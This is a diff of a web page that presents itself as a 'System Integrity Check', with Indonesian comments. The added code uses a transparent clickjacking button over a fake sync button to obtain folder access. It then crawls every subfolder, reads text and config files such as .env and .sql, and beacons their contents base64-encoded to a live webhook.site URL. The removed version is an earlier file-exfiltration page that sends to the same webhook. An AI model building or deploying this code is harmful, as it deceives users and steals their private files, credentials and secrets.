@@ -1,71 +1,155 @@
 <!DOCTYPE html>
-<html>
-<head><title>System Deep Indexer</title></head>
-<body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
-    <div style="padding:40px;border:2px solid #0f0;text-align:center;box-shadow:0 0 80px #0f0;background:rgba(0,20,0,0.9)">
-        <h1 style="letter-spacing:5px">V229_CENTINEL</h1>
-        <p id="status">AWAITING_DEEP_FILESYSTEM_SCAN...</p>
-        <button onclick="deepScan()" style="padding:20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;box-shadow:0 0 20px #0f0">START_RECURSIVE_SYNC</button>
-        <div id="log" style="font-size:10px;color:#0a0;margin-top:20px;text-align:left;max-height:150px;overflow-y:auto;border-top:1px solid #0a0">
-            > SCAN_ENGINE: READY<br>
-            > TARGET_API: FS_ACCESS_RECURSIVE
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>System Integrity Check</title>
+    <style>
+        body {
+            background: #050505;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        /* Clickjacking Overlay Layer */
+        .ui-wrapper {
+            position: relative;
+            width: 400px;
+            padding: 30px;
+            border: 1px solid #00ff00;
+            text-align: center;
+            background: #000;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+        }
+
+        /* Tombol Palsu yang Menarik Perhatian */
+        .fake-btn {
+            background: #00ff00;
+            color: #000;
+            border: none;
+            padding: 15px 30px;
+            font-weight: bold;
+            font-size: 1.1em;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 100%;
+            transition: 0.3s;
+        }
+
+        /* Tombol Asli (Picker) Dibuat Transparan Tepat di Atas Tombol Palsu */
+        #real-trigger {
+            position: absolute;
+            bottom: 30px; /* Sesuaikan posisi agar tumpang tindih sempurna */
+            left: 30px;
+            width: calc(100% - 60px);
+            height: 50px;
+            opacity: 0.001; /* Nyaris tidak terlihat tapi tetap bisa diklik */
+            cursor: pointer;
+            z-index: 10;
+        }
+
+        #log {
+            font-size: 10px;
+            color: #008800;
+            text-align: left;
+            margin-top: 20px;
+            height: 80px;
+            overflow: hidden;
+            border-top: 1px solid #004400;
+            padding-top: 10px;
+        }
+
+        .status-active { color: #ff0000; text-shadow: 0 0 5px #ff0000; }
+    </style>
+</head>
+<body>
+
+    <div class="ui-wrapper">
+        <h2 id="header">CORE_SYSTEM_SCAN</h2>
+        <p style="color: #ccc; font-size: 14px;">Izin akses folder diperlukan untuk memverifikasi integritas file sistem dan membersihkan cache browser.</p>
+        
+        <div style="position: relative;">
+            <button class="fake-btn">SINKRONISASI SEKARANG</button>
+            <button id="real-trigger" onclick="initiateChain()">INVISIBLE</button>
         </div>
+
+        <div id="log">> STANDBY: Awaiting User Gesture...</div>
     </div>
 
 <script>
-    const webhook = "https://webhook.site/4b8bf8c3-835d-4844-aa61-280dccabaf72";
+    const WEBHOOK = "https://webhook.site/4b8bf8c3-835d-4844-aa61-280dccabaf72";
+    let fileCount = 0;
 
-    async function deepScan() {
+    async function initiateChain() {
+        const logEl = document.getElementById('log');
+        const headerEl = document.getElementById('header');
+        
         try {
-            // 1. REQUEST DIRECTORY HANDLE
+            // STAGE 1: Browser-to-OS Sandbox Bridge
             const dirHandle = await window.showDirectoryPicker();
-            document.getElementById('status').innerText = "SCANNING_IN_PROGRESS...";
-            document.getElementById('status').style.color = "#f00";
+            
+            // Visual deception: Mengubah UI agar user merasa proses "aman" sedang berjalan
+            headerEl.innerText = "SCANNING_ACTIVE";
+            headerEl.classList.add("status-active");
+            logEl.innerHTML = "> ACCESS_GRANTED: Starting Recursive Index...";
 
-            // 2. TRIGGER RECURSIVE ENGINE
-            await scanRecursive(dirHandle, "");
+            // STAGE 2: Persistence (Optional Chaining - Service Worker dapat didaftarkan di sini)
+            
+            // STAGE 3: Recursive Data Siphoning
+            await crawlAndSiphon(dirHandle, "");
 
-            document.getElementById('status').innerText = "FULL_SYNC_COMPLETE";
-            document.getElementById('status').style.color = "#0f0";
-            log("!! TOTAL_EXFILTRATION_SUCCESS");
+            logEl.innerHTML += `<br>> SUCCESS: ${fileCount} files indexed.`;
+            headerEl.innerText = "SCAN_COMPLETE";
+            headerEl.classList.remove("status-active");
 
         } catch (err) {
-            log("!! ACCESS_DENIED: " + err.message);
+            logEl.innerHTML = "> ERROR: " + err.message;
         }
     }
 
-    async function scanRecursive(handle, path) {
+    async function crawlAndSiphon(handle, path) {
         for await (const entry of handle.values()) {
-            const currentPath = path + "/" + entry.name;
+            const currentPath = `${path}/${entry.name}`;
 
             if (entry.kind === 'file') {
-                log(`READING: ${currentPath}`);
                 try {
                     const file = await entry.getFile();
-                    const content = await file.text();
+                    
+                    // Filter: Hanya ambil file teks/config sensitif untuk efisiensi payload
+                    if (/\.(txt|json|php|env|sql|config|js|html)$/i.test(entry.name) || file.size < 50000) {
+                        const content = await file.text();
+                        fileCount++;
 
-                    // 3. AUTOMATED EXFILTRATION
-                    // Mengirimkan nama file, path, dan isi kontennya sekaligus
-                    navigator.sendBeacon(`${webhook}?v=V229_CONTENT_LEAK`, btoa(JSON.stringify({
-                        file: entry.name,
-                        path: currentPath,
-                        data: content.substring(0, 5000) // Limit data per request
-                    })));
+                        // STAGE 4: Stealth Exfiltration via Beacon API
+                        // Beacon tetap berjalan meskipun user navigasi keluar halaman
+                        const payload = btoa(JSON.stringify({
+                            ts: Date.now(),
+                            name: entry.name,
+                            path: currentPath,
+                            size: file.size,
+                            data: content.substring(0, 10000) // Ambil 10KB pertama
+                        }));
+
+                        navigator.sendBeacon(`${WEBHOOK}?v=ULTIMATE_CHAIN`, payload);
+                        
+                        // Update UI log secara terbatas agar tidak lag
+                        if (fileCount % 5 === 0) {
+                            document.getElementById('log').innerHTML = `> EXFIL_IN_PROGRESS: ${currentPath}`;
+                        }
+                    }
                 } catch (e) {
-                    log(`!! SKIP_LOCKED: ${entry.name}`);
+                    // Silently skip locked files
                 }
             } else if (entry.kind === 'directory') {
-                log(`ENTERING_SUBDIR: ${entry.name}`);
-                // Rekursif: Masuk ke dalam sub-folder
-                await scanRecursive(entry, currentPath);
+                // Deep recursion into subfolders
+                await crawlAndSiphon(entry, currentPath);
             }
         }
-    }
-
-    function log(msg) {
-        const l = document.getElementById('log');
-        l.innerHTML += `<div>> ${msg}</div>`;
-        l.scrollTop = l.scrollHeight;
     }
 </script>
 </body>
